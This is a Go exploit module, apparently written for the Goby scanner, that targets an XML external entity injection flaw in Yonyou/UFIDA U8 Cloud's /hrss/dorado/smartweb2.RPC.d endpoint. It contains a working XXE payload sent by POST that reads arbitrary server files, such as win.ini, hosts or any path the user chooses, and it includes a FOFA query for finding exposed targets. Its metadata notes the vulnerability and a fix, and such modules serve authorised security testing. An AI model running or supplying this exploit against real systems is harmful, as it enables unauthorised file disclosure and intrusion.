package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Ufida /hrss/dorado/smartweb2.RPC.d XML External Entity Injection Vulnerability",
    "Description": "<p>There is an XML external entity injection vulnerability in the smartweb2.RPC.d interface of the UFIDA NC system. Attackers can exploit this vulnerability to perform attacks such as file reading and intranet port scanning.</p>",
    "Product": "yonyou-U8-Cloud",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2023-10-17",
    "PostTime": "2024-06-19",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "body=\"请下载新版UClient\" && title=\"U8C\"",
    "GobyQuery": "body=\"请下载新版UClient\" && title=\"U8C\"",
    "Level": "1",
    "Impact": "<p>Attackers can exploit this vulnerability to perform attacks such as file reading and intranet port scanning.</p>",
    "Recommendation": "<p>1. Contact the manufacturer to upgrade to the latest security version. </p><p>2. Add request content verification to the /hrss/dorado/smartweb2.RPC.d interface and try to avoid processing untrusted XML input.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "win_ini,hosts,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "C:/windows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "XML External Entity Injection"
    ],
    "VulType": [
        "XML External Entity Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.3",
    "Translation": {
        "CN": {
            "Name": "用友Ufida /hrss/dorado/smartweb2.RPC.d XML外部实体注入漏洞",
            "Product": "用友-U8-Cloud",
            "Description": "<p>用友NC系统的smartweb2.RPC.d接口存在XML外部实体注入漏洞，攻击者可以利用该漏洞进行文件读取、内网端口扫描等攻击。<br></p>",
            "Recommendation": "<p>1.联系厂商升级至最新安全版本。</p><p>2.对/hrss/dorado/smartweb2.RPC.d接口添加请求内容的校验，尽量避免处理不可信的XML输入。</p>",
            "Impact": "<p>攻击者可以利用该漏洞进行文件读取、内网端口扫描等攻击。<br><br></p>",
            "VulType": [
                "XML外部实体注入"
            ],
            "Tags": [
                "XML外部实体注入"
            ]
        },
        "EN": {
            "Name": "Ufida /hrss/dorado/smartweb2.RPC.d XML External Entity Injection Vulnerability",
            "Product": "yonyou-U8-Cloud",
            "Description": "<p>There is an XML external entity injection vulnerability in the smartweb2.RPC.d interface of the UFIDA NC system. Attackers can exploit this vulnerability to perform attacks such as file reading and intranet port scanning.<br></p>",
            "Recommendation": "<p>1. Contact the manufacturer to upgrade to the latest security version.&nbsp;</p><p>2. Add request content verification to the /hrss/dorado/smartweb2.RPC.d interface and try to avoid processing untrusted XML input.</p>",
            "Impact": "<p>Attackers can exploit this vulnerability to perform attacks such as file reading and intranet port scanning.<br></p>",
            "VulType": [
                "XML External Entity Injection"
            ],
            "Tags": [
                "XML External Entity Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "Variables": {},
    "PocId": "10962"
}`

	setPayloadRequestHash0001 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, string, error) {

		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}
		makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			re := regexp.MustCompile(RegularUrl)
			// 查找匹配的内容
			matches := re.FindStringSubmatch(RegularContent)
			if len(matches) > 1 {
				return matches[1], nil
			} else {
				return "", fmt.Errorf("can't match value")
			}
		}
		//漏洞url地址
		url := "/hrss/dorado/smartweb2.RPC.d?__rpc=true"
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
			"Content-Type":    "application/x-www-form-urlencoded",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Encoding": "gzip, deflate",
		}

		data := "__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM \"file:///" + fileUrl + "\" >]><rpc transaction=\"10\" method=\"resetPwd\"><vps><p name=\"__profileKeys\">%26Password;</p ></vps></rpc>"
		resp, err := setPostRequest(hostInfo, url, data, header)
		if err != nil || resp.StatusCode != 200 {
			//fmt.Println("resp statuscode not 200")
			return "", "", err
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		readResult, _ := makeRegular(resp.RawBody, `value="([\s\S]*?)"`)

		return readResult, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 函数继承
			readFileFunc := setPayloadRequestHash0001
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"C:/windows/win.ini": "fonts",
			}

			for filePath, fileContent := range defaultModeMap {
				pocResult, pocUrl, err := readFileFunc(u, filePath)
				if err != nil {
					//fmt.Printf("请求 %s 失败: %v\n", filePath, err)
					continue
				}

				// 判断响应内容是否包含期望的内容
				if strings.Contains(pocResult, fileContent) {
					//fmt.Printf("%s 返回内容包含 %s\n", filePath, fileContent)
					// 设置VULURL
					ss.VulURL = u.HostInfo + pocUrl
					return true
				} else {
					//fmt.Printf("%s 返回内容不包含 %s\n", filePath, fileContent)
				}
			}

			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"win_ini": {"C:/windows/win.ini", "fonts"},
				"hosts":   {"C:/Windows/system32/drivers/etc/hosts", "localhost"},
			}
			// 此处需要修改：函数继承
			readFileFunc := setPayloadRequestHash0001

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			pocResult, _, err := readFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(pocResult, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = pocResult
			return expResult
		},
	))
}
